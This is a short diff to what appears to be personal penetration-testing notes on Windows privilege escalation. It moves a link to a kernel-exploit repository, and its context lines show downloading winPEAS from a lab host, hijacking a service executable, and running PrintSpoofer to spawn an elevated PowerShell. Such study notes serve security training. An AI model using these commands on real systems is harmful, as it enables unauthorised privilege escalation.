@@ -44,10 +44,6 @@
 ### Winpeas (may be info not correct)
 - Get file from remote ``` iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe ```
   
-
-# Kernal Exploit
-- https://github.com/SecWiki/windows-kernel-exploits
-
 # Hijack window service
 - Target find some exe origin is from that user and able to modify
 - If want to modify exe, better backup one first! e.g. ``` move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak ```
@@ -168,6 +164,7 @@
 
 ## public exploit
 -  kernel exploit (easy crash)
+- https://github.com/SecWiki/windows-kernel-exploits
 ### printspoofer
 -  If ```whoami /priv``` shows ``` SeImpersonatePrivlege``` enabled = can use 
 -   ``` .\PrintSpoofer64.exe -i -c powershell.exe ```
